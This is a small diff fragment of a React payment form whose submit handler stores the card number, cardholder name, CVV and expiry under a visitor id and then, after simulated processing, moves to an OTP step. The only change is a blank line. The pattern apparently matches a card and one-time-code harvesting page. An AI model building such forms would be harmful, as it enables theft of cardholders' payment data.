@@ -43,6 +43,7 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
+    
     const vId=localStorage.getItem('visitor')
     addData({id:vId,...data})
     // Simulate payment processing and move to OTP step
